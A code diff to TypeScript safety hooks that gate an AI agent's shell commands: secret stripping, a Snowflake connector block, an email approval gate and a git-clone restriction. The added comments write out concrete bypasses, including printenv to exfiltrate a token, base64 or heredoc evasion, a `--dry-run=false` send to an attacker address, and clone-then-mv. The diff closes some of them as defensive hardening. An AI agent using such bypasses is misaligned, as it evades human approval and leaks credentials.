@@ -247,6 +247,15 @@ const ANTHROPIC_KEY_RE = /^ANTHROPIC_API_KEY(_\d+)?$/;
 
 // Secrets the SDK needs for API auth but that Bash subprocesses must not see.
 // Built lazily inside the hook so late-bound env additions are covered.
+//
+// NANOCLAW_GH_TOKEN / GH_TOKEN / GITHUB_TOKEN are deliberately NOT in this
+// list. Stripping them would break the very thing the URL-scoped credential
+// helper is trying to enable: git invokes its helper via a subprocess that
+// inherits the Bash env, and the helper reads NANOCLAW_GH_TOKEN from there
+// to hand back to git. An agent that wants to exfiltrate the token can
+// `printenv` it — the mitigation is at the URL-scoped helper (token is
+// useless outside the allowlisted orgs) and at auth-level controls on
+// GitHub's side, not at the bash-env boundary.
 function buildSecretEnvVarList(): string[] {
   return [
     ...Object.keys(process.env).filter((k) => ANTHROPIC_KEY_RE.test(k)),
@@ -292,6 +301,13 @@ function denyBash(reason: string) {
 // credential mounts); the Python connector bypasses those. Only blocks
 // direct python execution — grep, echo, pip install, and existing
 // scripts that happen to contain the string are unaffected.
+//
+// This is ADVISORY, not a security boundary. The regex is bypassable
+// with base64-decoded source, heredocs, script files, or point-version
+// binaries (python3.11). The real mitigation is only mounting Snowflake
+// credentials when the snow CLI is actually invoked — a larger arch
+// change. In the current model the hook nudges the agent toward `snow
+// sql` for normal cases and raises the friction for unintended paths.
 const SNOWFLAKE_CONNECTOR_EXEC_RE = /\bpython[23]?\b.*\bsnowflake[._]connector\b/i;
 
 function createBlockSnowflakeConnectorHook(): HookCallback {
@@ -320,7 +336,11 @@ function createBlockSnowflakeConnectorHook(): HookCallback {
 // back to inbound.db's `delivered` table; we poll it via
 // awaitDeliveryAck. Up to 30 minutes.
 const GWS_EMAIL_SEND_RE = /\bgws\s+gmail\s+\+(?:send|reply|reply-all|forward)\b/;
-const EMAIL_BYPASS_RE = /\s--(?:dry-run|draft)\b/;
+// `(?:\s|$)` anchor prevents `--dry-run=false` from matching. The prior
+// `\b` alone was satisfied by `=`, which turned the guard into a trivial
+// bypass: `gws gmail +send --dry-run=false --to attacker@…` skipped the
+// approval while still sending.
+const EMAIL_BYPASS_RE = /\s--(?:dry-run|draft)(?:\s|$)/;
 
 function createEmailGateHook(): HookCallback {
   return async (input) => {
@@ -384,14 +404,21 @@ function createEmailGateHook(): HookCallback {
 }
 
 // ── Block ad-hoc `git clone` outside /tmp ──
-// Agents must use the create_worktree / clone_repo MCP tools to land a
-// repo inside the managed worktree tree. Direct `git clone` into
-// /workspace/agent or /workspace/worktrees skips auto-commit safety,
-// credential scoping, and the index registration that downstream tools
-// rely on. /tmp clones (ephemeral, sometimes needed for tool installs)
-// are allowed.
+// Agents must use create_worktree / clone_repo MCP tools to land a repo
+// inside the managed worktree tree. Direct `git clone` into
+// /workspace/agent or /workspace/worktrees skips the managed-worktree
+// path (auto-commit safety, credential scoping, index registration).
+//
+// Earlier we only rejected clones whose destination-arg wasn't /tmp/,
+// which was trivially bypassable: `git clone … /tmp/x && mv /tmp/x
+// /workspace/agent/stolen` passed because the clone segment targeted
+// /tmp and the move happened as a separate shell segment. This hook
+// now rejects the entire command if it mentions a managed-dir path
+// ANYWHERE alongside `git clone`, regardless of segment order. False
+// positives (e.g. `git clone /tmp/x && echo /workspace/agent exists`)
+// are acceptable — the agent can rephrase.
 const GIT_CLONE_RE = /\bgit\s+clone\b/;
-const GIT_CLONE_TMP_RE = /\bgit\s+clone\b[^;|&\n]*\s+\/tmp\//;
+const MANAGED_DIR_RE = /\/workspace\/(?:agent|worktrees|global|extra|thread|plugins)\b/;
 
 function createBlockGitCloneHook(): HookCallback {
   return async (input) => {
@@ -399,10 +426,13 @@ function createBlockGitCloneHook(): HookCallback {
     const command = (pre.tool_input as { command?: string })?.command;
     if (!command) return {};
     if (!GIT_CLONE_RE.test(command)) return {};
-    if (GIT_CLONE_TMP_RE.test(command)) return {};
-    return denyBash(
-      '`git clone` is blocked outside /tmp. Use the `create_worktree` MCP tool to get a working directory for a repo under `/workspace/worktrees/<repo>`. If the repo is not yet in the agent group, use `clone_repo` first.',
-    );
+    if (MANAGED_DIR_RE.test(command)) {
+      return denyBash(
+        '`git clone` with any reference to /workspace/{agent,worktrees,...} is blocked. Use the `create_worktree` MCP tool for a managed worktree under /workspace/worktrees/<repo>, or `clone_repo` to add a repo to the agent group. If the clone is ephemeral, keep the entire command within /tmp.',
+      );
+    }
+    // Allow pure /tmp-only clones (tool installs, scratch builds).
+    return {};
   };
 }
 
